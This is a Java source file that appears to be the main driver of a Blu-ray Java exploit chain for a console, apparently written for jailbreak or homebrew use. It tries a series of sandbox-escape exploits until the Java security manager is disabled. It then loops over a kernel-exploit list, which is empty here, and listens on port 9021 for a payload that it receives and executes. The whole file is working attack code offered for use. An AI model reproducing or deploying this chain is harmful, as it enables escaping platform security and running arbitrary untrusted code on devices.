/*
 * Copyright (C) 2021-2024 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package com.bdjb;

import com.bdjb.exploit.kernel.ExploitKernelInterface;
import com.bdjb.exploit.sandbox.ExploitDefaultImpl;
import com.bdjb.exploit.sandbox.ExploitSandboxInterface;
import com.bdjb.exploit.sandbox.ExploitServiceProxyImpl;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.ServerSocket;
import java.net.Socket;

public class Exploit {
  private static final int PAYLOAD_PORT = 9021;

  public static void main(Method screenPrintln) {
    Screen.setRemotePrintln(screenPrintln);
    Screen.println("[*] Escaping Java Sandbox...");

    Class[] sandboxExploits = new Class[] {ExploitDefaultImpl.class, ExploitServiceProxyImpl.class};

    for (int i = 0; i < sandboxExploits.length; i++) {
      try {
        ExploitSandboxInterface exploit =
            (ExploitSandboxInterface) sandboxExploits[i].newInstance();
        if (exploit.trigger()) {
          break;
        }
      } catch (Exception e) {
        continue;
      }
    }

    if (System.getSecurityManager() != null) {
      Screen.println("[-] Error could not disable security manager.");
      return;
    }

    Screen.println("[*] Exploiting kernel...");

    Class[] kernelExploits = new Class[] {};

    for (int i = 0; i < kernelExploits.length; i++) {
      try {
        ExploitKernelInterface exploit = (ExploitKernelInterface) kernelExploits[i].newInstance();
        if (exploit.trigger()) {
          break;
        }
      } catch (Exception e) {
        continue;
      }
    }

    while (true) {
      try {
        Screen.println("[*] Listening for payload on port " + PAYLOAD_PORT + "...");

        ServerSocket serverSocket = new ServerSocket(PAYLOAD_PORT);
        Socket socket = serverSocket.accept();
        InputStream inputStream = socket.getInputStream();
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

        byte[] buf = new byte[8192];
        int total = 0;
        int read;
        while ((read = inputStream.read(buf)) > 0) {
          outputStream.write(buf, 0, read);
          total += read;
        }

        inputStream.close();
        socket.close();
        serverSocket.close();

        Screen.println("[+] Received " + total + " bytes");

        Screen.println("[*] Launching payload...");
        Payload payload = new Payload(outputStream.toByteArray());
        int ret = payload.execute();

        Screen.println("[*] Payload exited: " + Integer.toHexString(ret));
      } catch (Exception e) {
        Screen.println("[-] Error: " + e.getMessage());
      }
    }
  }
}
